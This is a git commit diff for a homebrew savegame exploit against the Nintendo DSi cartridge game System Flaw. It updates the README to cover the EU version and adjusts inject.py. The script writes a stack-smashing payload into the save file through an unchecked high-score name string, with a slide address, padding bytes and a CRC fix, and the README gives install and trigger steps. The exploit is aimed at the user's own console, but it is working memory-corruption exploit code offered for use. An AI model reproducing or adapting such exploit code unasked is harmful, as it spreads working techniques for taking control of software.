082e3860e8f9b3c8ef1e5eef1dda8e773ad4ef08
zoogie <secretAgentCokey@gmail.com>
2019-04-11 03:16:42 -0500

    EU version of system flaw exists and it works with no further modification

--- README.txt
+++ README.txt
@@ -1,6 +1,6 @@
 WHAT:
 This is a savegame exploit for the System Flaw cartridge game on the Nintendo DSi (NOT the DSiWare game, System Flaw: Recruit).
-This game is US-only and is the first DSi exclusive cartridge title to be exploited (to my knowledge).
+This game is available for the US and EU and is the first DSi exclusive cartridge title to be exploited (to my knowledge).
 It uses a null terminated high-score name string that is not size checked to overwrite the stack with data. See inject.py for more info.
 
 WHY:
@@ -11,7 +11,7 @@ Q: Why isn't the hax title very creative?
 A: Because the game's name is already a perfect exploit name :p
 
 HOW:
-Install - Just take the SYSTEMFLAW.0.SAV file and use TWLSaveTool on the 3DS to write it to your cart. 
+Install - Just take the SYSTEMFLAW.0.SAV file and use TWLSaveTool on the 3DS to write it to your cart. The included save works for both US and EU.
 You might also use a DS savegame manager, but I don't know much about those, or if they even work with DSi exclusive games.
 Exploit trigger - Click past the splash screens then select: Survival -> HARD -> Start, and the exploit will run.
 This also works fine on the no$gba emulator. I tested with the latest emu version and the NAND booting option set up.
@@ -21,3 +21,4 @@ Notes: This is a very minor project to take a break from larger and more difficu
 Greetz:
 CTURT for the color pattern asm code.
 Martin Korth for no$gba
+rebane2001 for testing the EU version
--- inject.py
+++ inject.py
@@ -1,7 +1,7 @@
 import sys,struct
 
 slide_start=0x02140104  		#the exact jump address landing location in no$gba seems to be off a bit compared to real hardware. fortunately, there's a huge area of 00000000 nop sliding to work with, so we put this jump address way before our payload to be safe.
-payload_location=0x02167C6C   	#this is where our actual payload is in RAM. we slide to it from the above address (this var not used here).
+payload_location_US=0x02167C6C  #this is where our actual payload is in RAM. we slide to it from the above address (EUR version's address is 021667EC). these values aren't used in this script.
 haxstring_file_offset=0x168
 crc16_message_len=0x1FC
 crc16_location=0x1FC+2
@@ -34,7 +34,7 @@ haxstring="Haxxxxxxxxxxxxxxxxxx" 						#there are five consecutive 3-char hardmo
 														#the vuln used here is a null terminated string that is not size verified. as a result, it smashes the stack with our haxstring data.
 haxstring+=struct.pack("<I", slide_start) 				#our inexact jump address that lands way before the payload address.
 haxstring+=("\x20\xA0\xFF"*14 + "\x20\xA0" + "\x00") 	#the jump address being too close to the string's end will cause it to be overwritten with junk on the stack before the jump. that's why the weird padding is added.
-														#also, the 20-a0-ff pattern keeps the excess string length from terminating prematurly. weird.
+														#also, the 20-a0-ff pattern keeps the excess string length from terminating into an infinite loop crash. weird.
 with open("SYSTEMFLAW.0.sav","rb+") as f:
 	print("writing payload to sav ...")
 	f.seek(0)
